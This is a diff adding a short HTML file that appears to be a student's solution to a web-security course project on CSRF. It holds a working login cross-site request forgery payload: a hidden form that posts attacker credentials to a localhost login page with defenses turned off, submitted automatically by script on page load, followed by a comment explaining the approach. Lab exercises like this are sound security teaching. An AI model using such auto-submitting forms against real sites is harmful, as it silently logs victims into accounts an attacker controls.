@@ -1,0 +1,19 @@
+<html>
+<body>
+<form id="csrfForm" method="POST" action="http://localhost/project2/login?csrfdefense=0&xssdefense=4">
+    <input type="hidden" name="username" value="attacker">
+    <input type="hidden" name="password" value="badguy4">
+</form>
+<script>
+    document.getElementById('csrfForm').submit();
+</script>
+</body>
+</html>
+
+<!--The logic behind this code was pretty simple. Since there's no defenses, all I needed to do was to make the login for attacker, 
+and then have a new html file that would simply automatically send in the login info upon clicking this file. Since there's no defenses, 
+this will automatically login the user.
+
+References: N/A
+Collaborators: N/A
+-->
